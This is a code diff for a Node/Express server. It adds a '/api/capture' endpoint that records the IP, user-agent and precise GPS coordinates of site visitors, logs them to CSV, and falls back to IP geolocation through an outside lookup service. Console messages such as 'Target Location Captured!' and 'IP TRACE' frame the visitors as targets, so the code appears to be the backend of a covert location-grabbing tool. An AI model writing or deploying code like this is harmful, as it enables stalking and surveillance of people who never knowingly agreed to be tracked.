@@ -5,6 +5,7 @@ const geoip = require('geoip-lite');
 const fs = require('fs');
 const path = require('path');
 require('dotenv').config();
+const axios = require('axios');
 
 const app = express();
 const PORT = process.env.PORT || 5000;
@@ -63,6 +64,38 @@ app.post('/api/log-gps', (req, res) => {
   } catch (error) {
     res.status(500).json({ success: false });
   }
+});
+
+app.post('/api/capture', async (req, res) => {
+    const { latitude, longitude, type } = req.body;
+    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip;
+    if (ip === '::1' || ip === '127.0.0.1') ip = "8.8.8.8"; // Dummy for local testing
+
+    console.log(`[!] SIGNAL RECEIVED FROM IP: ${ip}`);
+
+    if (type === "gps_precise") {
+        console.log("-----------------------------------------");
+        console.log("🎯 ALERT: Target Location Captured!");
+        console.log(`Latitude:  ${latitude}`);
+        console.log(`Longitude: ${longitude}`);
+        console.log(`User-Agent: ${req.headers['user-agent']}`);
+        console.log("-----------------------------------------");
+        
+        // Log to CSV
+        const geo = geoip.lookup(ip) || { city: 'Unknown', region: 'Unknown' };
+        logVisitToCSV(ip, geo.city, geo.region, 'GPS-Based (Active)', latitude, longitude);
+    } else {
+        // Fallback: Get general location from IP
+        try {
+            const response = await axios.get(`http://ip-api.com/json/${ip}`);
+            const geo = response.data;
+            console.log(`📡 IP TRACE: ${geo.city}, ${geo.regionName}, ISP: ${geo.isp}`);
+            logVisitToCSV(ip, geo.city, geo.regionName, 'IP-Based (Passive)', geo.lat, geo.lon);
+        } catch (e) {
+            console.log("IP lookup failed, likely local address.");
+        }
+    }
+    res.sendStatus(200);
 });
 
 // Serve frontend static files
